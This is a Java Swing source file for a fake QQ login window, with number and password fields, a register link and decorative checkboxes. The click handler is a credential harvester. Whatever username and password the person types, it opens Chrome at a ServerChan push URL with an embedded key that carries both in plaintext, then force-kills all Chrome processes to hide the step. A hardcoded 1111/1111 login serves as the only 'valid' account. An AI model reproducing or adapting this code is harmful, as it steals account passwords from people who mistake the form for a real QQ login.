package com.war.qq;

import com.war.chat.Rebot;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.IOException;

/**
 * wanglu2325@qq.com
 * Created by 89114282 on 2017-4-15 11:45
 */
public class LoginButton {

    JTextField textField = new JTextField();
    JPasswordField textField1 = new JPasswordField();
    JButton login = new JButton();
    public void Input(JPanel a){
        textField1.setEchoChar('#');
        textField.setBounds(130,15,200,30);
        textField1.setBounds(130,42,200,30);
        textField.addKeyListener(new KeyAdapter() {
            public void keyTyped(KeyEvent e) {
                int keyChar = e.getKeyChar();
                if (keyChar >= KeyEvent.VK_0 && keyChar <= KeyEvent.VK_9) {

                } else {
                    e.consume(); //关键，屏蔽掉非法输入
                }

            }
        });
        textField1.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                //控制台打印按键内容
                //System.out.println(e.getKeyChar());
            }
        });
        a.add(textField);
        a.add(textField1);
    }

    public void ButtonLogin(JPanel jp1,final JFrame jf) {
        login.setBounds(130, 110, 200, 30);
        login.setBackground(new Color(9, 163, 220));
        login.setText("登录");
        login.setBorder(null);

        //对login button 添加点击事件，
        login.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
//               System.out.println(new String(textField1.getPassword()).equals("111"));
                click(jf);

            }

            @Override
            public void mouseEntered(MouseEvent e) {
                super.mouseEntered(e);
            }

            @Override
            public void mouseExited(MouseEvent e) {
                super.mouseExited(e);
            }
        });
        jp1.add(login);
    }
    public void link(JPanel jp1){
        JLabel reg = new JLabel("<html><a href=\"  \">点击注册</a></html>");
        reg.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                String url = "zc.qq.com";
                try {
                    Runtime.getRuntime().exec("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE "+url);
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });
        //找回密码。
        JLabel music = new JLabel("<html><a href=\"\">听音乐</a></html>");
        music.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                String url = "http://fm.baidu.com/";
                try {
                    Runtime.getRuntime().exec("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE "+url);
                } catch (IOException e1) {
                    e1.printStackTrace();
                }
            }
        });
        music.setBounds(340, 42, 60, 30);
        reg.setBounds(340,15,60,30);//定位链接位置
        jp1.add(reg);
        jp1.add(music);
        // 记住密码     自动登录  无效果
        JCheckBox jcb = new JCheckBox("记住密码");
        JCheckBox jcb1 = new JCheckBox("自动登录");
        jcb.setBounds(130,80,80,15);
        jcb1.setBounds(250,80,80,15);
        jcb.setBackground(new Color(235,242,249));
        jcb1.setBackground(new Color(235,242,249));
        jp1.add(jcb);
        jp1.add(jcb1);
    }
    public void click(JFrame jf){
        if (textField.getText().equals("1111")&&(new String(textField1.getPassword()).equals("1111"))){
            System.out.println("登陆成功！");
            String url = "1http://sc.ftqq.com/SCU5009T072b58fc0bb2cfbe27b5a120138d6e2f586f0bdf1024a.send?text=账户登陆成功通知！"+"&&desp=用户名"+textField.getText()+"" +
                    "" +
                    "用户密码"+new String(textField1.getPassword());
            Rebot dm = new Rebot();
            try {
                dm.FFFF();
                jf.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent e) {
                        System.exit(0);
                    }
                });
            } catch (IOException e) {
                e.printStackTrace();
            }

            try {
                Process p = Runtime.getRuntime().exec("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe "+url);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e1) {
                }
                Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }else{
            String url = "http://sc.ftqq.com/SCU5009T072b58fc0bb2cfbe27b5a120138d6e2f586f0bdf1024a.send?text=账户登陆失败通知！"+"&&desp=用户名"+textField.getText()+"" +
                    "" +
                    "用户密码"+new String(textField1.getPassword());
            try {
                Runtime.getRuntime().exec("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe "+url);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e1) {
                e1.printStackTrace();
            }

            try {
                Runtime.getRuntime().exec("taskkill /F /IM chrome.exe");
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        }
    }


}
